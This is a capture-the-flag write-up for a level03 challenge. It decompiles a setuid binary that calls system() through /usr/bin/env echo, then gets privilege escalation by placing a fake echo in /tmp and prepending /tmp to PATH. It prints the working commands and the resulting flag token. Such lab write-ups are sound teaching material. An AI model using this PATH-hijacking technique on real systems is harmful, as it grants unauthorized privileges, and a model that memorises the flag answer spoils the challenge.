we see really quick that in the `~/` directory we have a `level03` file
we first use `file level03` to check the file, and it tells us that this file is a not stripped ELF 32-Bit
we can gather more info with `readelf --all level03`, and we can see it's a Executable file and this file is not using PIC
we use `scp` to copy the file in your system and use `dogbolt.org` to analyze it

and in the main() function we see this code:

```c
int main()
{
    unsigned int v0;  // [bp-0xc]
    unsigned int v1;  // [bp-0x8]

    v0 = getegid();
    v1 = geteuid();
    setresgid(v0, v0, v0);
    setresuid(v1, v1, v1);
    return system("/usr/bin/env echo Exploit me");
}
```

the program get the egid and euid and setup gid and all uid and gid to those value
also we can see that this file belong to `flag03` user
finally the user call `system("/usr/bin/env echo")`
the `/usr/bin/env` is used here to run a program in a modified environment
the program runed here is echo

because of all this we can trick the system to start a custom echo
firstly we create a file echo with the payload and give it the right to execute:
`echo "/bin/bash -c getflag" > /tmp/echo`
`chmod 755 /tmp/echo`

after that we create the custom env, where we put `/tmp` at the begining of `PATH` to make the system start the custom echo
`export PATH=/tmp:$PATH`

and we run the program `./level03` we get `qi0maab88jeaj46qoumi7maus`